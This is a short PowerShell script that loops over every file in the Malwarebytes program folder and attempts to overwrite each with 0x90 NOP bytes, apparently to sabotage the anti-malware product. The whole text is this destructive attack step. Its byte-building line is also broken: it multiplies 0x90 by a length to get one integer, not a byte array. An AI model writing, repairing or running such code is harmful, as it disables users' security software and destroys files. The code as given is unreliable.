$folder = "C:\Program Files\Malwarebytes\"
$files = Get-ChildItem -Path $folder -File

foreach ($file in $files) {
    $length = (Get-Item $file.FullName).Length
    $nopBytes = 0x90 * $length
    Set-Content -Path $file.FullName -Value ([System.Text.Encoding]::ASCII.GetString($nopBytes))
}

